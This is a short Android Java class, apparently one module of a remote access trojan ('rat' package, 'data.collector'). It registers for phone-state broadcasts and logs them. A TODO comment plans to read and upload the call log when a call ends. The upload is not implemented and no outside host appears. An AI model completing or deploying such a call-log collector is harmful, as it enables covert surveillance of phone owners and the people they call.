package com.vendor.rat.data.collector;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;

/**
 * 通话状态接收器 (模块 05)
 *
 * 监听通话状态变化，收集通话记录
 */
public class CallReceiver extends BroadcastReceiver {

    private static final String TAG = "CallReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!TelephonyManager.ACTION_PHONE_STATE_CHANGED.equals(intent.getAction())) {
            return;
        }

        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        Log.d(TAG, "Phone state: " + state);

        if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
            // 通话结束，读取最新通话记录
            // TODO: 查询 CallLog 并上传
        }
    }
}
